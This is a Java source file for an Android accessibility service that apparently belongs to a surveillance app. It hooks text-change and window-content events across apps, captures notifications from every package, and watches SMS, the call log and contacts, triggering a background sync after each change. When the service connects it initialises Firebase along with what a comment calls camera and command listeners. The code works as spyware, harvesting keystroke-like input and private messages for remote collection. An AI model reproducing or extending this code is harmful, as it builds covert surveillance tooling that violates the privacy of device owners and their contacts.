package com.vikasyadavnsit.cdc.services;

import static com.vikasyadavnsit.cdc.utils.AccessibilityUtils.processNotificationEvent;
import static com.vikasyadavnsit.cdc.utils.AccessibilityUtils.processTextChangedEvent;

import android.accessibilityservice.AccessibilityService;
import android.database.ContentObserver;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;

public class CDCAccessibilityService extends AccessibilityService {

    private static final String TAG = "CDCAccessibilityService";

    private ContentObserver smsObserver;
    private ContentObserver callLogObserver;
    private ContentObserver contactsObserver;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Detailed log for all events when debug level is active
        LoggerUtils.d(TAG, "Event: " + AccessibilityEvent.eventTypeToString(event.getEventType()) 
                + " from pkg: " + event.getPackageName());

        if (isTextChangedEvent(event)) {
            processTextChangedEvent(event);
        } else if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            LoggerUtils.i(TAG, "New Notification detected from: " + event.getPackageName());
            processNotificationEvent(event);
        }
    }

    @Override
    public void onServiceConnected() {
        LoggerUtils.i(TAG, "Accessibility Service Connected and Bound");
        com.vikasyadavnsit.cdc.utils.FirebaseUtils.initialize(this);
        com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository.initialize(this);
        com.vikasyadavnsit.cdc.database.repository.DeviceDataRepository.initialize(this);
        
        // Full background initialization including camera and command listeners
        com.vikasyadavnsit.cdc.utils.FirebaseUtils.initializeServices(this);

        registerObservers();
    }

    private void registerObservers() {
        Handler handler = new Handler(Looper.getMainLooper());
        
        try {
            smsObserver = new ContentObserver(handler) {
                @Override
                public void onChange(boolean selfChange) {
                    LoggerUtils.d(TAG, "SMS Content Changed");
                    triggerDeltaSync();
                }
            };
            getContentResolver().registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver);
        } catch (Exception e) {
            LoggerUtils.w(TAG, "Failed to register SMS observer: " + e.getMessage());
        }

        try {
            callLogObserver = new ContentObserver(handler) {
                @Override
                public void onChange(boolean selfChange) {
                    LoggerUtils.d(TAG, "Call Log Content Changed");
                    triggerDeltaSync();
                }
            };
            getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver);
        } catch (Exception e) {
            LoggerUtils.w(TAG, "Failed to register Call Log observer: " + e.getMessage());
        }

        try {
            contactsObserver = new ContentObserver(handler) {
                @Override
                public void onChange(boolean selfChange) {
                    LoggerUtils.d(TAG, "Contacts Content Changed");
                    triggerDeltaSync();
                }
            };
            getContentResolver().registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, contactsObserver);
        } catch (Exception e) {
            LoggerUtils.w(TAG, "Failed to register Contacts observer: " + e.getMessage());
        }
    }

    private void triggerDeltaSync() {
        androidx.work.OneTimeWorkRequest request = new androidx.work.OneTimeWorkRequest.Builder(DeltaSyncWorker.class).build();
        androidx.work.WorkManager.getInstance(this).enqueue(request);
    }

    @Override
    public boolean onKeyEvent(KeyEvent event) {
        //LoggerUtils.d("AccessibilityService", "Key Event Received: ${event?.keyCode}");
        return super.onKeyEvent(event);
    }

    @Override
    public void onInterrupt() {
        // Handle interruption, if necessary
    }

    @Override
    public void onDestroy() {
        if (smsObserver != null) getContentResolver().unregisterContentObserver(smsObserver);
        if (callLogObserver != null) getContentResolver().unregisterContentObserver(callLogObserver);
        if (contactsObserver != null) getContentResolver().unregisterContentObserver(contactsObserver);
        super.onDestroy();
    }

    private static boolean isTextChangedEvent(AccessibilityEvent event) {
        int type = event.getEventType();
        return type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED 
                || type == AccessibilityEvent.TYPE_VIEW_FOCUSED
                || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
    }

}
